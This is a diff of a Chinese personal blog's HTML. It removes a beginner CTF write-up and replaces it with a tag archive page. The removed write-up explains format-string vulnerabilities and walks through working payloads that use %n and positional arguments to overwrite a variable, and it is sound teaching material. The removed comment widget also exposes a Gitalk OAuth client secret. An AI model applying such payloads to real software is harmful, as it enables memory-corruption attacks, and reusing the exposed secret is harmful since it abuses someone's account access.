@@ -6,20 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://l0tus.vip">
-  <title>谈谈近期学到的简单的东西(二) | L0tus&#39; blog</title>
+  <title>Tag: 汇编学习之路 | L0tus&#39; blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="兔兔的%printf功能中fmtstr格式化字符串漏洞 write up   这是一道pwn方向的入门题。格式化字符串的成因在于像printf&#x2F;sprintf&#x2F;snprintf等格式化打印函数都是接受可变参数的，一旦程序编写不规范例如将printf(&quot;%s&quot;,a)，偷懒写成printf(a)，此时就存在格式化字符串漏洞。关于这一题我们需要用到的知识点不多：">
-<meta property="og:type" content="article">
-<meta property="og:title" content="谈谈近期学到的简单的东西(二)">
-<meta property="og:url" content="http://l0tus.vip/2022/08/02/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="L0tus&#39; blog">
+<meta property="og:url" content="http://l0tus.vip/tags/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/index.html">
 <meta property="og:site_name" content="L0tus&#39; blog">
-<meta property="og:description" content="兔兔的%printf功能中fmtstr格式化字符串漏洞 write up   这是一道pwn方向的入门题。格式化字符串的成因在于像printf&#x2F;sprintf&#x2F;snprintf等格式化打印函数都是接受可变参数的，一旦程序编写不规范例如将printf(&quot;%s&quot;,a)，偷懒写成printf(a)，此时就存在格式化字符串漏洞。关于这一题我们需要用到的知识点不多：">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-08-02T08:41:00.000Z">
-<meta property="article:modified_time" content="2022-09-10T04:51:46.230Z">
 <meta property="article:author" content="L0tus">
-<meta property="article:tag" content="pwn笔记">
-<meta property="article:tag" content="write up">
+<meta property="article:tag" content="C++">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="L0tus&#39; blog" type="application/atom+xml">
@@ -163,221 +158,61 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-知识回顾（二）" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      谈谈近期学到的简单的东西(二)
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2022" class="archive-year">2022</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2022/09/12/9.12%E6%B1%87%E7%BC%96/" class="archive-article-date">
+  	<time datetime="2022-09-12T11:39:56.165Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-09-12</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2022/09/12/9.12%E6%B1%87%E7%BC%96/">9.12汇编语言（第一章）</a>
     </h1>
   
 
-        <!--显示阅读次数-->
-        
-          <br/>
-         <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
-         <span class="icon-sort"></span>
-         <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
-          	阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
-          </span>
-          </a>
-        
-        <!--显示阅读次数完毕-->
-        
-        <a href="/2022/08/02/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%BA%8C%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2022-08-02T08:41:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="兔兔的-printf功能中fmtstr格式化字符串漏洞-write-up"><a href="#兔兔的-printf功能中fmtstr格式化字符串漏洞-write-up" class="headerlink" title="兔兔的%printf功能中fmtstr格式化字符串漏洞 write up"></a>兔兔的%printf功能中fmtstr格式化字符串漏洞 write up</h1><p>   这是一道pwn方向的入门题。格式化字符串的成因在于像printf&#x2F;sprintf&#x2F;snprintf等格式化打印函数都是接受可变参数的，一旦程序编写不规范例如将<code>printf(&quot;%s&quot;,a)</code>，偷懒写成<code>printf(a)</code>，此时就存在格式化字符串漏洞。关于这一题我们需要用到的知识点不多：<br>   一、用$来表示第几个参数例如<code>%printf(&quot;%d%3$d&quot;,1,2,3)</code>输出为3。<br>   二、%n的使用，%n是往对应参数指向的内存写入已经输出的字符数量。这句话中有两个要点，1该参数为一个指针，2写入的值为<strong>字符数量</strong>。<br>   三、利用%p输出指针所指的地址。<br>   四、关于<code>%&quot;数字&quot;c</code> 的用法，在C之前可以加上数字，其作用是产生对应长度的参数，可以与%n配合向地址中写入数字(当然该数字指的是该参数的长度)。<br>        好，那么知道了这四点我们就可以来获取flag啦~<br>   <span id="more"></span></p>
-<hr>
-<h2 id="1、利用-s与-符号获取hint"><a href="#1、利用-s与-符号获取hint" class="headerlink" title="1、利用%s与$符号获取hint"></a>1、利用%s与$符号获取hint</h2><p>   白夜学长提示我们先对兔子输入%s试试，%s的作用是打印地址的内容，默认为1，那么我们首先对兔兔输入<code>%printf %s</code>，会得到如下反馈<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wow,好像被你发现了彩蛋？</span><br><span class="line">------------</span><br><span class="line">now the key = 2333333333     (l0tus:笨兔兔，笨笨)</span><br></pre></td></tr></table></figure><br>   接着利用$符号让其输出不同的参数，尝试<code>%printf %s%2$s</code>，得到的反馈是<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wow,好像被你发现了彩蛋？fmtstr了解一下？</span><br><span class="line">------------</span><br><span class="line">now the key = 2333333333</span><br></pre></td></tr></table></figure><br>   显然我们的$符号生效了，其输出结果发生了改变但显然目前还不是我们想要的结果，于是接着尝试<code>%printf %s%3$s</code>,得到如下反馈<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wow,好像被你发现了彩蛋？hint1:当key=5时即可拿到flag</span><br><span class="line">------------</span><br><span class="line">now the key = 2333333333</span><br></pre></td></tr></table></figure><br>   那么我们的第一个hint就找到了，也告诉了我们下一步的方向：改变key的值，</p>
-<h2 id="2、获取key的地址"><a href="#2、获取key的地址" class="headerlink" title="2、获取key的地址"></a>2、获取key的地址</h2><p>   这一步其实就是上一步的延续，光有hint1我们是不够修改key的数据的，那我们接着找hint2，这里中间的尝试过程我就不展示了，直接到hint2。输入为<code>%printf %s%6$s</code>（可以简化成<code>%printf %6$s</code>）反馈是<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">很好，hin2：</span><br><span class="line">the $ of &amp;key = 175(也许你需要再了解一下fmtstr)</span><br><span class="line">-------------</span><br><span class="line">now the key = 2333333333</span><br></pre></td></tr></table></figure><br>   当时做到这一步时很欣慰，心里其实已经有答案了。根据我的C++基础可以得知&amp;key意思就是key的地址，而 $ 对应的也就是其偏移量，那么这句话就可以很轻松地翻译成：<strong>key的地址偏移为175</strong>，那么我们就可以很轻松地获取key的地址了，输入<code>%printf %175$p</code>,%p代表地址，文章开头提到过，那么175$指的就是偏移量为175的地址数据，也就是我们的key的地址，得到如下反馈<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x558c21ed0188</span><br><span class="line">-------------</span><br><span class="line">now the key = 2333333333</span><br></pre></td></tr></table></figure></p>
-<h2 id="3、改写key的值"><a href="#3、改写key的值" class="headerlink" title="3、改写key的值"></a>3、改写key的值</h2><p>   上一步我们得出了key的地址为<strong>0x558c21ed0188</strong>，那么我们便可以用%c配合%n来改写key的值了<br>   我当时输入<code>%printf %5c%175$n0x558c21ed0188</code>，得到的反馈是这样的<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`0x558c21ed0188</span><br><span class="line">-------------</span><br><span class="line">now the key = 5</span><br><span class="line">VidarTeam&#123;Welcome_To_The_Bin_World_XD&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="4、反思"><a href="#4、反思" class="headerlink" title="4、反思"></a>4、反思</h2><p>   那么，flag是找出来了，<strong>但上面那行多余的输出是怎么回事呢？</strong><br>   当时的我并没有反应过来这个问题，后来白夜学长让我试试多输出几次key的地址，会发现每一次输出key的地址是不一样的，于是我尝试了<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一次：</span><br><span class="line">0x561dc0915188</span><br><span class="line">-------------</span><br><span class="line">now the key = 23333333</span><br><span class="line">第二次：</span><br><span class="line">0x55d5e48f4188</span><br><span class="line">-------------</span><br><span class="line">now the key = 23333333</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>   可见两次输出的key地址确实不同，白夜学长说这个是二进制程序的一种内存保护方式，将程序的起始地址随机化。<br>   因为%175$s就是表示将已经输出的字符数量写入第175个参数指向的内存，那么我的payload后面的地址就成了多余的成分，所以有了flag上面的多余输出。因此，获取flag时的那段payload就可以简化成<code>%printf %5c%175$n</code>,这样直接将5写入第175号参数就可以啦，得到的输出是<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`</span><br><span class="line">-------------</span><br><span class="line">now the key = 5</span><br><span class="line">VidarTeam&#123;Welcome_To_The_Bin_World_XD&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
-<h2 id="5、本文的最后"><a href="#5、本文的最后" class="headerlink" title="5、本文的最后"></a>5、本文的最后</h2><p>   首先感谢您的驻足，祝您永生愉悦！<br>   这道题的难度特别适合新手，稍微学几个简单的payload符号，有一点编程基础，就可以看懂两个hint，跟着hint走就可以顺理成章得获取flag。<br>   我的这篇wp写得也是非常简陋，有些细节可能说得不准确，大佬们见谅~<br>   最后感谢白夜学长的耐心指导与及时的提醒，<del>也感谢他的奶茶</del><br>   就写到这里啦，拜拜~</p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pwn笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">write up</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">汇编学习之路</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://l0tus.vip/2022/08/02/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%BA%8C%EF%BC%89/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2022/08/14/nervous/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          日记：最近非常焦虑...
-        
-      </div>
-    </a>
   
   
-    <a href="/2022/08/01/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%B8%80%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">谈谈近期学到的简单的东西(一)</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
+    
 
-  
-
-  
-
-
-
-  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-
-<script type="text/javascript">
-
-if(true){
-    var gitalk = new Gitalk({
-    clientID: 'd7ed634dc972bb7fd909',
-    clientSecret: 'fb780f732ab4e8af3a1059bd864c85b1b5235496',
-    repo: 'comments.github.io',
-    owner: 'ChrisL0tus',
-    admin: ['ChrisL0tus'],
-    id: 'Tue Aug 02 2022 16:41:00 GMT+0800',
-    distractionFreeMode: 'true'
-})
-gitalk.render('gitalk-container') 
-}
-</script>
-  
 
           </div>
         </div>
@@ -409,9 +244,9 @@ gitalk.render('gitalk-container')
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
